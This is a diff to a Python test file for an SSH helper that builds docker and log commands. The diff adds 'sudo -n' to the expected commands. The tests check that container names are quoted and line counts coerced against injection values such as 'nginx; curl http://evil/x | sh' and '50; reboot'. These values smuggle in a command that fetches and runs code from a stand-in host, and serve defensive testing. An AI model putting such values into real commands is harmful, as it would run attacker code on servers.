@@ -39,15 +39,15 @@ def test_get_logs_quotes_service_and_coerces_lines():
     ssh = _RecordingSSH()
     ssh.get_logs("host1", service=INJECTION, lines="50; reboot")
     # docker attempt succeeds in the stub, so only the first command is built
-    assert ssh.commands[0] == "docker logs --tail 100 'nginx; curl http://evil/x | sh' 2>&1"
+    assert ssh.commands[0] == "sudo -n docker logs --tail 100 'nginx; curl http://evil/x | sh' 2>&1"
 
 
 def test_docker_helpers_quote_container_name():
     ssh = _RecordingSSH()
     ssh.docker_restart("host1", INJECTION)
     ssh.docker_inspect("host1", INJECTION)
-    assert ssh.commands[0] == "docker restart 'nginx; curl http://evil/x | sh'"
-    assert ssh.commands[1] == "docker inspect 'nginx; curl http://evil/x | sh'"
+    assert ssh.commands[0] == "sudo -n docker restart 'nginx; curl http://evil/x | sh'"
+    assert ssh.commands[1] == "sudo -n docker inspect 'nginx; curl http://evil/x | sh'"
 
 
 def test_process_list_quotes_filter_pattern():
